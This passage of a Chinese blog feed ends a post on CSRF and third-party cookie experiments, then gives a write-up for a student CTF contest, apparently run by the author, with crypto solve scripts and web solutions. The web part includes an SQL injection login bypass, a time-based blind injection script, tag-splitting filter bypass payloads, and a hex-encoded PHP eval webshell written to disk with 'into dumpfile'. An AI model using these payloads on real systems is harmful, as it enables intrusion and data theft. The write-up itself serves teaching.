alt=""></p><p>此时在另外一个域中，有一个页面<code>http://127.0.0.1/index.html</code>，此页面构造了CSRF以访问<code>67.209.184.30</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://67.209.184.30/&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></p><p>此时如果是IE，会默认禁止浏览器在<img>、<iframe>、<script>、<link>等标签中发送第三方Cookie，也就是说只能发送出<strong>Session Cookie</strong>，而<strong>Third-party Cookie</strong>被禁止。</p><p>但是因为我是用的Firefox，所以默认策略是允许发送第三方Cookie的<br><img src="https://i.imgur.com/r4BaRvl.png" alt=""></p><h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是<iframe>、<script>等标签也将不再拦截第三方Cookie的发送。</p><p>假设127.0.0.1/index.html的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p></script></iframe></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看道哥的《白帽子讲web安全》(大学买的第一本书)，觉得物超所值啊~把书上的一些简单的实验给复现一下，记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="《白帽子讲web安全》" scheme="http://Err0rzz.github.io/tags/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B/"/>
    
      <category term="书籍学习" scheme="http://Err0rzz.github.io/tags/%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>第一届智商杯wp</title>
    <link href="http://Err0rzz.github.io/2017/12/11/%E7%AC%AC%E4%B8%80%E5%B1%8A%E6%99%BA%E5%95%86%E6%9D%AFwp/"/>
    <id>http://Err0rzz.github.io/2017/12/11/第一届智商杯wp/</id>
    <published>2017-12-11T07:54:09.000Z</published>
    <updated>2017-12-13T07:47:02.876Z</updated>
    
    <content type="html"><![CDATA[<p>周末出题老表伤透了心，原本高高兴兴的打算直接用做出来的童鞋的wp，结果发现没人做，还是得自己写…</p><a id="more"></a><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>这次的密码题都是偏向简单的题目<br><br></p><h2 id="女神的短信"><a href="#女神的短信" class="headerlink" title="女神的短信"></a>女神的短信</h2><p>提示短信，手机键盘九宫格加密，前面那个数字表示第几个按钮，后面那个数字表示那个按钮第几个(没想到最后变成了真正的签到题，看着动态积分从1000变到20，emmmmm所有队伍都做出来了)。<br><br></p><h2 id="签到题–RSA"><a href="#签到题–RSA" class="headerlink" title="签到题–RSA"></a>签到题–RSA</h2><p>最基本的rsa解密，直接贴py代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import gmpy2</div><div class="line">p = 3487583947589437589237958723892346254777 </div><div class="line">q = 8767867843568934765983476584376578389</div><div class="line">c = 4058547387436141457047422472489672162421145320474233882240312859636305303864</div><div class="line">e = 65537</div><div class="line">inv_n = (p-1)*(q-1)</div><div class="line">d = gmpy2.invert(e,inv_n)</div><div class="line">m = pow(c,d,p*q)</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/XhkYEyz.png" alt=""><br><br></p><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><p>上课也讲过的共模攻击，最让老表伤心的是没有一个人去看老表的上课用的课件<a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/" title="RSA套路">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a><br>还是直接贴代码吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">c1=0x1cbd53af140710b23864f60e8d0741951b89bd03ce4d73573b0e8bb4d33b36a624e645312613b06759cfa9c4fa00bf8d4781a8e89aL</div><div class="line">c2=0x5a87c76d2d79694e75ad2911c44d8208a7447852f26b37480dbc9d376579add2bed957db9b76fd16c60cccbbc9e901dddfe9a1eb3L</div><div class="line">n=6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</div><div class="line">e1=839</div><div class="line">e2=773</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">      return (b, 0, 1)</div><div class="line">    else:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">      raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">      return x % m</div><div class="line"></div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line"></div><div class="line">if s1&lt;0:</div><div class="line">   s1 = - s1</div><div class="line">   c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">   s2 = - s2</div><div class="line">   c2 = modinv(c2, n)</div><div class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/ANlX3hp.png" alt=""><br><br></p><h2 id="有意思的解密"><a href="#有意思的解密" class="headerlink" title="有意思的解密"></a>有意思的解密</h2><p>下载zip里面有两个文件，key.txt是一串十六进制，转化一下得到key=<code>&#39;i_think_zz_is_ok&#39;</code>，然后flag.py文件是rc4的加密函数，对着加密函数逆推一个解密函数即可(有童鞋百度出解密函数也算是不预期解吧，其实耐心推一下也很快的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">import random</div><div class="line">import base64</div><div class="line">from hashlib import sha1</div><div class="line">strCipher = &apos;dOo0foiNBuQvKQ1oEdPiLawHQHtwYoGZu6CsmQwM4MD9Rkz0VVMzJTcz0/EDmHAwhgg16VA0MulkmKYnzNnFk9cwJAG6FQ==&apos;</div><div class="line">key = &apos;i_think_zz_is_ok&apos;</div><div class="line"></div><div class="line">def crypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line"></div><div class="line">    x = y = 0</div><div class="line">    out = []</div><div class="line">    for char in data:</div><div class="line">        x = (x + 1) % 256</div><div class="line">        y = (y + box[x]) % 256</div><div class="line">        box[x], box[y] = box[y], box[x]</div><div class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line"></div><div class="line">    return &apos;&apos;.join(out)</div><div class="line"></div><div class="line">def decrypt(data, key):</div><div class="line">    x = 0</div><div class="line">    box = range(256)</div><div class="line">    for i in range(256):</div><div class="line">        x = (x + box[i] + ord(key[i % len(key)])) % 256</div><div class="line">        box[i], box[x] = box[x], box[i]</div><div class="line">    x = y = 0</div><div class="line">    data1=[]</div><div class="line">    for char in data:</div><div class="line">        x=(x+1)%256</div><div class="line">        y=(y+box[x])%256</div><div class="line">        box[x],box[y] = box[y], box[x]</div><div class="line">        data1.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))</div><div class="line">    return &apos;&apos;.join(data1)</div><div class="line"></div><div class="line">  </div><div class="line">def encode(data, key, encode=base64.b64encode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    data = salt + crypt(data, sha1(key + salt).digest())</div><div class="line">    if encode:</div><div class="line">        data = encode(data)</div><div class="line">    return data</div><div class="line"></div><div class="line">def decode(data, key, decode=base64.b64decode, salt_length=16):</div><div class="line">    salt = &apos;&apos;</div><div class="line">    if decode:</div><div class="line">        data=decode(data)</div><div class="line">    for n in range(salt_length):</div><div class="line">        salt += chr(random.randrange(256))</div><div class="line">    #salt=&apos;11&apos;</div><div class="line">    salt=data[:16]</div><div class="line">    out=data[16:]</div><div class="line">    return decrypt(out,sha1(key + salt).digest())</div><div class="line">    </div><div class="line">print decode(strCipher,key)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/hC3Mn2F.png" alt=""><br><br></p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>这题讲道理比上一题要简单，但是因为上一题网上有rc4的解密代码，所以做出来的人比这题多…<br>原题目，flag.py:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">key = &apos;zjgsctf&apos;</div><div class="line">cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos;</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]  </div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)  </div><div class="line">       d1,d2 = d2,d1</div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p>观察代码可以发现，对key的操作变换并没有涉及随机数，所以加密用的subkeys和解密用的subkeys是一样的。然后就可以对着bes_encrypt的代码逆着写一份bes_decrypt出来，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">from hashlib import sha256</div><div class="line"></div><div class="line">def xor(a,b):</div><div class="line">    return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])</div><div class="line"></div><div class="line">def HASH(data):</div><div class="line">    return sha256(data).digest()[:8]</div><div class="line"></div><div class="line">def bes_encrypt(subkeys, data):</div><div class="line">    i = 0</div><div class="line">    d1 = data[:8]</div><div class="line">    d2 = data[8:]  </div><div class="line"></div><div class="line">    print d2.encode(&apos;hex&apos;)  </div><div class="line">    for i in subkeys:</div><div class="line">       d1 = xor(xor(HASH(d2),i),d1)  </div><div class="line">       d1,d2 = d2,d1</div><div class="line"></div><div class="line">    return d2 + d1</div><div class="line"></div><div class="line"></div><div class="line">def bes_decrypt(subkeys,data):</div><div class="line">    data = data.decode(&apos;hex&apos;)</div><div class="line">    d2 = data[:8]</div><div class="line">    d1 = data[8:]</div><div class="line"></div><div class="line">    subkeys=subkeys[::-1]</div><div class="line">    for i in subkeys:</div><div class="line">        d1,d2=d2,d1</div><div class="line">        d1 = xor(xor(HASH(d2),i),d1)</div><div class="line"></div><div class="line">    return d1+d2</div><div class="line"></div><div class="line">def key_schedule(key):</div><div class="line">    subKeys = []</div><div class="line">    subKey = key</div><div class="line">    for i in xrange(16):</div><div class="line">        subKey = HASH(subKey)</div><div class="line">        subKeys.append(subKey)</div><div class="line">    return subKeys</div><div class="line"></div><div class="line">def bes(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">def besdd(key,data):</div><div class="line">    subKeys = key_schedule(key)</div><div class="line">    return bes_decrypt(subKeys, data)</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    key = &apos;zjgsctf&apos;</div><div class="line">    cipher = &apos;112a9166aebc5e677573f365d8b38c72&apos;</div><div class="line">    print besdd(key,cipher)</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/E0a2xXd.png" alt=""><br><br></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>我原以为…算了，想想某涛的pwn一题都没被做出来，我心里还是有点安慰的。<br><br></p><h2 id="签到题–sql1"><a href="#签到题–sql1" class="headerlink" title="签到题–sql1"></a>签到题–sql1</h2><p>右键源码可以看到php源码<img src="https://i.imgur.com/fPKUvkB.png" alt=""><br>对输入的两个参数都没加任何过滤，而且只需要sql查询有结果即可返回flag，最简单的payload就是<strong>username=’ or 1=1#&amp;password=</strong><br><img src="https://i.imgur.com/dOnk02n.png" alt=""><br><br></p><h2 id="又一个签到题"><a href="#又一个签到题" class="headerlink" title="又一个签到题"></a>又一个签到题</h2><p>我一开始以为这种题目大家应该都做吐了的，所以又是送分题…后来发现并不是这样…<br>一开始说<strong>Only localhost can get flag!</strong>，那修改一下http请求头里的<code>x-forwarded-for</code>为<code>127.0.0.1</code>，然后发现变成了<strong>Only Chinese can get flag!</strong>，那修改一下语言，将<code>Accept-Language</code>中的<code>en-US</code>    去掉，得到flag<img src="https://i.imgur.com/zUGfqqc.png" alt=""><br><br></p><h2 id="Lazy壮壮–sql2"><a href="#Lazy壮壮–sql2" class="headerlink" title="Lazy壮壮–sql2"></a>Lazy壮壮–sql2</h2><p>测试一下会发现没有回显，猜测是时间盲注。然后试了试<code>sleep</code>方法，会发现被过滤了，而且这个题目只过滤了<code>sleep</code>。那么咋们就换一个函数好了，换成<code>benchmark</code>，其他的还是原来的配方，写个盲注脚本就好了(这里我先在本地试了下<code>benchmark(20000000,md5(&#39;test&#39;))</code>大概需要7秒多，你们也可以自行更改参数来调整)。这里友情提示一下，你们可以把这些脚本收集一下，以后可以直接修改脚本，做题效率会高很多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import time</div><div class="line">url = &apos;http://10.21.13.152:20001/check.php&apos;</div><div class="line">payloads=&apos;1234567890qwertyuiopasdfghjklzxcvbnm_@QWERTYUIOPASDFGHJKLZXCVBNM,*&apos;</div><div class="line"></div><div class="line">def exp(i,x):</div><div class="line">    #sql2.users233.p4sswo3d</div><div class="line">    #xx = &quot;&apos; or if(substring((select database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    #xx = &quot;&apos; or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    #xx = &quot;&apos; or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users233&apos;)  from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line">    xx = &quot;&apos; or if(substring((select group_concat(p4sswo3d) from users233) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot;</div><div class="line"></div><div class="line">    data=&#123;&apos;id&apos;:xx %(i,x)&#125;</div><div class="line">    first_time=time.time()</div><div class="line">    response = requests.post(url,data = data)</div><div class="line">    next_time=time.time()</div><div class="line">    if (next_time-first_time) &gt; 2:</div><div class="line">        return 1</div><div class="line">    else :</div><div class="line">        return 0</div><div class="line"></div><div class="line">ans=&apos;&apos;</div><div class="line">print &apos;star&apos;</div><div class="line">for i in range(1,100):</div><div class="line">    for x in payloads:</div><div class="line">        if exp(i,x)==1:</div><div class="line">            ans+=x</div><div class="line">            print ans</div><div class="line">            break</div><div class="line">    if x==&apos;*&apos;:</div><div class="line">        print &quot;over&quot;</div><div class="line">        break</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/N15K7ST.png" alt=""><br>解出来两个md5值，去cmd5解一下，一个是’no’，另一个是’hacker’。提交hacker即可。</p><h2 id="其实很简单–sql3"><a href="#其实很简单–sql3" class="headerlink" title="其实很简单–sql3"></a>其实很简单–sql3</h2><p>右键源码可以看到提示说需要<code>?id</code>，或者遇到这种什么都没有的题目的思路一般都是源码泄露(我题目也说了’壮壮好像泄露了什么…’)，这里是<code>.index.php.swp</code>文件泄露，下载下来之后用<code>vim -r</code>打开即可恢复源码。<br>观察源码，会发现是数字型注入，而且过滤了很多函数。但是同时也发现有个不起眼但是很“多余”的函数<code>strip_tags</code>，这个函数拿去百度一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</div></pre></td></tr></table></figure></p><p>这样一切的过滤都可以轻松绕过了，只需要将<code>select</code>改成<code>sele&lt;br&gt;ct</code>这样，即在中间加上html标签即可，如下测试：<br><img src="https://i.imgur.com/uS3Mlmx.png" alt=""></p><p>接下来就是最基本的sql注入了，就不多啰嗦了，直接贴payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">列数：http://10.21.13.152:20002/?id=1 o&lt;br&gt;rder b&lt;br&gt;y 3</div><div class="line">库名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,database(),3</div><div class="line">表名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct ta&lt;br&gt;ble_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()</div><div class="line">列名：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(distinct column_name),3 fr&lt;br&gt;om info&lt;br&gt;rmation_schema.columns where ta&lt;br&gt;ble_schema=database()and ta&lt;br&gt;ble_name=&apos;flag_here&apos;</div><div class="line">数据：http://10.21.13.152:20002/?id=-1 uni&lt;br&gt;on se&lt;br&gt;lect 1,group_concat(passwdzz),3 fr&lt;br&gt;om flag_here</div></pre></td></tr></table></figure></p><p>因为我题目里用了<code>limit</code>，所以这里最好用<code>group_concat</code>来获得所有数据，然后用<code>distinct</code>来去掉重复的。<br><img src="https://i.imgur.com/gU5ynCX.png" alt=""><br><br></p><h2 id="好心的壮壮–sql4"><a href="#好心的壮壮–sql4" class="headerlink" title="好心的壮壮–sql4"></a>好心的壮壮–sql4</h2><p>这个题目我把源码贴了上去，观察源码可以发现有两个文件，一个是<code>index.php</code>，另一个是<code>include.php</code>。一个注入题为什么要给文件包含的函数呢，这不是明摆着让你们用sql写木马，然后去包含嘛，心塞塞…</p><p>再看<code>index.php</code>，我用每个人的ip来作为目录名创建了一个权限<strong>777</strong>的目录，然后再去进行正常的sql代码(这么明显的提示…)。然后我们还会发现，并没有过滤掉<strong>dumpfile</strong>以及<strong>outfile</strong>以及<strong>into</strong>。现在目标明确，一切就绪，准备用sql语句写个木马吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post:id=-1 union select 0x3c3f706870206576616c28245f504f53545b22616161225d293b203f3e into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/K2jl4kN.png" alt=""></p><p>这里有个全场唯一的一个小坑，就是如果你是正常的写’&lt;?php eval($_POST[“aaa”]); ?&gt;’这个一句话木马的话，中间php部分会消失掉，like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post:id=-1 union select &quot;&lt;?php eval($_POST[&apos;aaa&apos;]); ?&gt;&quot; into dumpfile &apos;/tmp/10.21.107.235/aaa.php&apos;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/zb4z5i1.png" alt=""></p><p>所以，好心的壮壮又给你们个送分，把你们发送过去的东西打印出来。所以我们选择用十六进制来绕过这个坑点。<br>然后用<code>include.php</code>去包含就好了<br><img src="https://i.imgur.com/XXc6qCY.png" alt=""></p><p>然后连菜刀去吧。<img src="https://i.imgur.com/HjaT1Rj.png" alt=""></p><p>随便翻翻目录就可以找到目录<img src="https://i.imgur.com/zG2ebIC.png" alt=""></p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>这个题目算是基本套路吧…我提示也是反复强调伪协议，可是最后还是只有master一个队做出来，心塞塞…</p><p>看到<code>url</code>里有个<code>?page</code>，先想到<code>filter</code>伪协议去读源码，然后把所有源码都爬下来之后，主要的几个文件如下:<br>upload.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">&lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; </div><div class="line"> &lt;?php</div><div class="line"> header(&quot;content-type:text/html;charset=utf-8&quot;);</div><div class="line"> include &apos;config.php&apos;;</div><div class="line"></div><div class="line">function get_random_token()&#123;</div><div class="line">    $random_token = &apos;&apos;;</div><div class="line">    $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;;</div><div class="line">    for($i = 0; $i &lt; 16; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(1, 61), 1);</div><div class="line">    &#125;</div><div class="line">    return $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"> if (isset($_POST[&apos;Upload&apos;])) &#123;</div><div class="line">            $target_path =&quot;./Err0r/&quot;;</div><div class="line">            $target_name=get_random_token();</div><div class="line">            $target_path = $target_path . $target_name;</div><div class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</div><div class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</div><div class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; </div><div class="line"></div><div class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;png&quot; || $uploaded_ext == &quot;PNG&quot;|| $uploaded_ext == &quot;gif&quot; || $uploaded_ext == &quot;GIF&quot;|| $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</div><div class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path.&quot;.&quot;.$uploaded_ext)) &#123;                   </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;               </div><div class="line">                  &#125; else &#123;               </div><div class="line">                    echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                    echo $target_path .&quot;.&quot;.$uploaded_ext .&apos; succesfully uploaded!&apos;;</div><div class="line">                    echo &apos;&lt;/pre&gt;&apos;;                    </div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            else&#123;        </div><div class="line">                echo &apos;&lt;pre&gt;&apos;;</div><div class="line">                echo &apos;Your image was not uploaded.&apos;;</div><div class="line">                echo &apos;&lt;/pre&gt;&apos;;</div><div class="line">            &#125; </div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>include.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"> &lt;META http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf8&quot;&gt; 